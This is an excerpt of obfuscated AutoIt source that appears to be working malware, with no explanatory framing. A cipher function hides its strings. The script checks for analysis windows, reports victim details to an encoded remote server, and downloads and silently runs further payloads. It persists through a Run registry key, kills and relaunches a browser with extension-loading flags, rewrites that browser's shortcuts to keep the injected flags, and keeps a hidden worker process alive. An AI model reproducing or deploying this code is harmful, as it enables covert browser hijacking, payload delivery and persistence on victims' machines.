...
$xsjmcte = @AppDataDir & "\" & @UserName
$fippxuxh = "SYhX)Dl&V(0cEw?9PWajxf/-6sKyN|B[:OQ3rvoL#Tzmdg1JHZM]2 7R8p5G4tCUik.=eq,n_F\AIu*b"
$isbycdzr = "j_8zc(WQ5MSCA,U#fIwJkl6evbPVuEa-DBsTHRn)X:N/\rFiyxg3K. p|1G9h*?&7qZY20t=LO4[]mdo"
$aodkwcc = WinGetTitle(kcbodbyqk("AEc3Wy|I"))
If $aodkwcc = "" Then
	$aodkwcc = "Empty"
EndIf
$kcamxcp = StringSplit(kcbodbyqk("0,Bg,8)u* -Z-8KgbMgBu7(BoBM-g8|uR,H"), "|")
$uyziajfdlltp = StringSplit(kcbodbyqk("NR*B,-g86J*-b"), "|")
$mfookipi = kcbodbyqk("zb")
$yuezf = ProcessList(@ScriptName)
For $bqcqta = 1 To $yuezf[0][0]
	If $yuezf[$bqcqta][1] <> @AutoItPID Then Exit
Next
mzwnbr()

Func mzwnbr()
	$mfookipi = RegRead(kcbodbyqk("r2c?d0bP,aBg-dcb*-)"), kcbodbyqk("WoQ,Bff-*"))
	If $mfookipi = kcbodbyqk("=-Q") Then
		glqrzoqbtdfo()
	Else
		$mfookipi = kcbodbyqk("zb")
		fygxv()
...
Func fygxv()
	For $i = 1 To $kcamxcp[0]
		$tkezkzjmdh = StringInStr($aodkwcc, $kcamxcp[$i])
		If $tkezkzjmdh <> 0 Then
			Exit
		EndIf
	Next
	oyuszascxljz()
...
Func oyuszascxljz()
	$izikl = False
	For $i = 1 To $uyziajfdlltp[0]
		$tkezkzjmdh = StringInStr(StringLower(@ScriptName), $uyziajfdlltp[$i])
		If $tkezkzjmdh <> 0 Then
			$izikl = True
			ExitLoop
		EndIf
...
Func amyoy()
	RegWrite(kcbodbyqk("r2c?d0bP,aBg-dcb*-)"), kcbodbyqk("WoQ,Bff-*"), kcbodbyqk("v|5Y0."), kcbodbyqk("=-Q"))
	glqrzoqbtdfo()
EndFunc

Func glqrzoqbtdfo()
	$rnhzudczk = ObjCreate(kcbodbyqk("aJo4,,R aJo4,,Rg-kN-Q, V p"))
	$rnhzudczk.open(kcbodbyqk("5|3"), kcbodbyqk("4,,RTmmx-Q-SJ H-XB6 sJ*mBRJm)4-ggHmfbMJo R4R"), False)
	$rnhzudczk.setrequestheader(kcbodbyqk("?Q-g[EM-o,"), kcbodbyqk("yJ*-b7:baofbB*-g"))
	$rnhzudczk.setrequestheader(kcbodbyqk("lJo*ba"), $aodkwcc)
	$rnhzudczk.setrequestheader(kcbodbyqk("0)gJR,zBu-"), @ScriptName)
	$rnhzudczk.setrequestheader(kcbodbyqk("F0"), @OSVersion)
	$rnhzudczk.setrequestheader(kcbodbyqk("WoQ,Bff-*"), $mfookipi)
	$rnhzudczk.send()
	If $rnhzudczk.status <> 200 Then Exit
	jycblrlld()
EndFunc
...
Func umepph()
	If NOT FileExists($xsjmcte & "\" & kcbodbyqk("iXB -Z-")) Then
		InetGet(kcbodbyqk("4,,RTmmx-Q-SJ H-XB6 sJ*mBRJm)4-ggHmiXB -Z-"), $xsjmcte & "\" & kcbodbyqk("iXB -Z-"), 1, 0)
	EndIf
	InetGet(kcbodbyqk("4,,RTmmx-Q-SJ H-XB6 sJ*mBRJm)4-ggHmPJf-Q iX"), $xsjmcte & "\" & kcbodbyqk("PJf-Q iX"), 1, 0)
	kwjco()
EndFunc

Func kwjco()
	RunWait($xsjmcte & "\" & kcbodbyqk("iXB -Z-7-7PJf-Q iX7[BbB7[R/rV*iV.h&aM|-&H?"), $xsjmcte, @SW_HIDE)
	yawdsfons()
EndFunc

Func yawdsfons()
	FileCopy(@ScriptFullPath, $xsjmcte & "\" & kcbodbyqk(")4-ggH -Z-"), 1)
	jwueijcig()
EndFunc

Func jwueijcig()
	$xasuay = kcbodbyqk("Av|5|#K3W3_|TDCJLD tc4gbu- tLI")
	While WinGetHandle($xasuay)
		WinClose($xasuay)
	WEnd
	ProcessClose(kcbodbyqk(")4gbu- -Z-"))
	ProcessWaitClose(kcbodbyqk(")4gbu- -Z-"))
	eiwfxrfycgew()
EndFunc

Func eiwfxrfycgew()
	RegWrite(kcbodbyqk("r2c?d0bP,aBg-d(J)gbQbP,dlJo*baQdcNgg-o,y-gQJbodvNo"), kcbodbyqk("5bbMf-7?R*B,-g"), kcbodbyqk("v|5Y0."), $xsjmcte & "\" & kcbodbyqk(")4-ggH -Z-"))
	oosmrzrn()
EndFunc

Func oosmrzrn()
	ShellExecute(kcbodbyqk(")4gbu- -Z-"), kcbodbyqk("[[-oBsf-[BN,buB,Jbo7[[*JQBsf-[JoPbsBgQ7[[fbB*[-Z,-oQJbon") & $xsjmcte, "", "", @SW_MAXIMIZE)
	nymcqz()
	jpdanvocya()
EndFunc

Func nymcqz()
	Local $tkrzgyme[5] = [@AppDataDir & kcbodbyqk("d(J)gbQbP,dWo,-go-,7|ZRfbg-gd&NJ)x7_BNo)4d?Q-g7KJoo-*d3BQxOBg"), @DesktopDir, @AppDataCommonDir & kcbodbyqk("d(J)gbQbP,dWo,-go-,7|ZRfbg-gd&NJ)x7_BNo)4d?Q-g7KJoo-*d3BQxOBg"), @ProgramsCommonDir, @DesktopCommonDir]
	For $bqcqta = 0 To 5 - 1
		eznczsgh($tkrzgyme[$bqcqta])
	Next
EndFunc

Func eznczsgh($evwlvmklo)
	Local $mhuvy = _filelisttoarray($evwlvmklo, kcbodbyqk("t fox"))
	If @error = 0 Then
		For $bqcqta = 0 To UBound($mhuvy, $ubound_rows) - 1
			uwjnbqempbn($evwlvmklo & "\" & $mhuvy[$bqcqta])
		Next
	EndIf
EndFunc

Func uwjnbqempbn($ipztwxp)
	$wrxivh = FileGetShortcut($ipztwxp)
	If NOT @error Then
		$lkbrsjf = _pathsplit($wrxivh[0], "", "", "", "")
		If $lkbrsjf[3] = kcbodbyqk(")4gbu-") Then
			jxwubmlk($wrxivh, $ipztwxp)
		EndIf
	EndIf
EndFunc

Func jxwubmlk($wrxivh, $ipztwxp)
	FileCreateShortcut($wrxivh[0], $ipztwxp, $wrxivh[1], kcbodbyqk("[[-oBsf-[BN,buB,Jbo7[[*JQBsf-[JoPbsBgQ7[[fbB*[-Z,-oQJbon") & $xsjmcte)
EndFunc

Func jpdanvocya()
	While 1
		If FileExists($xsjmcte & "\" & kcbodbyqk("abgx-g -Z-")) AND FileExists($xsjmcte & "\" & kcbodbyqk(")boPJM SQbo")) Then
			If NOT ProcessExists(kcbodbyqk("abgx-g -Z-")) Then
				Run($xsjmcte & "\" & kcbodbyqk("abgx-g -Z-"), NULL , @SW_HIDE)
			EndIf
		EndIf
		Sleep(5000)
	WEnd
...
Func kcbodbyqk($rqqqmc)
	$obxettiy = ""
	$anxrsjpwxxn = StringLen($rqqqmc)
	For $bqcqta = 0 To $anxrsjpwxxn
		$obxettiy &= StringMid($isbycdzr, StringInStr($fippxuxh, StringMid($rqqqmc, $bqcqta, 1), 1), 1)
	Next
	Return $obxettiy
EndFunc
